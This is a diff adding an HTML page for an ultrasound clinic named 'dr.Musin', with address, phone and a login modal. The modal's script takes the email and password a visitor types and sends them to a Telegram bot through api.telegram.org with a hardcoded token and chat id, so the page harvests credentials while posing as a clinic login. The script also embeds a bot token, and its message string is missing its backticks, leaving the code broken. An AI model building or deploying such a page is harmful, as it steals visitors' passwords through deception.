@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Кабинет dr.Musin - УЗИ кабинет</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #e6f0fa;
+    color: #002a6d;
+  }
+  header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 20px;
+    background: #c7d9f9;
+  }
+  .logo {
+    font-family: Georgia, serif;
+    font-size: 26px;
+    font-weight: bold;
+    color: #002a6d;
+  }
+  .btn {
+    background-color: #0052cc;
+    color: white;
+    border: none;
+    padding: 12px 20px;
+    border-radius: 5px;
+    font-size: 16px;
+    cursor: pointer;
+    text-decoration: none;
+  }
+  main {
+    padding: 40px 20px;
+    text-align: center;
+  }
+  main h1 {
+    font-size: 28px;
+    margin-bottom: 15px;
+  }
+  main p {
+    font-size: 18px;
+    margin-bottom: 25px;
+  }
+  .info {
+    background: #c7d9f9;
+    padding: 20px;
+    max-width: 400px;
+    margin: 0 auto 40px;
+    border-radius: 8px;
+    text-align: left;
+    font-size: 16px;
+  }
+  footer {
+    background: #c7d9f9;
+    text-align: center;
+    padding: 15px 10px;
+    font-size: 14px;
+    color: #0041a3;
+  }
+
+  /* Модальное окно */
+  .modal {
+    display: none;
+    position: fixed;
+    z-index: 100;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0, 0, 0, 0.5);
+  }
+  .modal-content {
+    background-color: #ffffff;
+    margin: 10% auto;
+    padding: 20px;
+    border-radius: 8px;
+    width: 90%;
+    max-width: 400px;
+  }
+  .modal-content h2 {
+    margin-top: 0;
+  }
+  .modal-content input {
+    width: 100%;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+  }
+  .modal-content .btn {
+    width: 100%;
+    margin-top: 10px;
+  }
+  .close {
+    float: right;
+    font-size: 24px;
+    cursor: pointer;
+  }
+
+  @media (max-width: 480px) {
+    main h1 {
+      font-size: 22px;
+    }
+    main p {
+      font-size: 16px;
+    }
+    .info {
+      max-width: 90%;
+      font-size: 14px;
+    }
+    .btn {
+      padding: 10px 16px;
+      font-size: 14px;
+    }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">dr.Musin</div>
+  <button class="btn" onclick="document.getElementById('loginModal').style.display='block'">Вход</button>
+</header>
+
+<main>
+  <h1>Добро пожаловать в кабинет dr.Musin</h1>
+  <p>Ваш надёжный УЗИ специалист<br>Быстро и качественно проведём обследование</p>
+  <button class="btn" onclick="document.getElementById('loginModal').style.display='block'">Вход</button>
+  <div class="info">
+    <p><strong>Адрес:</strong> 8 микрорайон, 7 дом</p>
+    <p><strong>Телефон:</strong> +7 707 362 21 73</p>
+    <p><strong>Время работы:</strong> Пн–Пт 9:00 – 18:00</p>
+  </div>
+</main>
+
+<!-- Модальное окно -->
+<div id="loginModal" class="modal">
+  <div class="modal-content">
+    <span class="close" onclick="document.getElementById('loginModal').style.display='none'">&times;</span>
+    <h2>Вход</h2>
+    <input type="email" placeholder="Email" id="email" required />
+    <input type="password" placeholder="Пароль" id="password" required />
+    <button class="btn" onclick="sendToTelegram()">Войти</button>
+  </div>
+</div>
+
+<footer>
+  © 2025 dr.Musin — УЗИ кабинет
+</footer>
+
+<script>
+  function sendToTelegram() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    const token = "7969052768:AAHxwMkaeXHdSr_BWTC013HJym4YTdxHxFk";
+    const chat_id = "6762566676";
+    const message = 📥 Новый вход:\nEmail: ${email}\nПароль: ${password};
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message
+      })
+    }).then(response => {
+      if (response.ok) {
+        alert("Отправлено!");
+        document.getElementById('loginModal').style.display = 'none';
+      } else {
+        alert("Ошибка при отправке.");
+      }
+    });
+  }
+
+  // Закрытие по клику вне окна
+  window.onclick = function(event) {
+    var modal = document.getElementById('loginModal');
+    if (event.target == modal) {
+      modal.style.display = "none";
+    }
+  }
+</script>
+
+</body>
+</html>
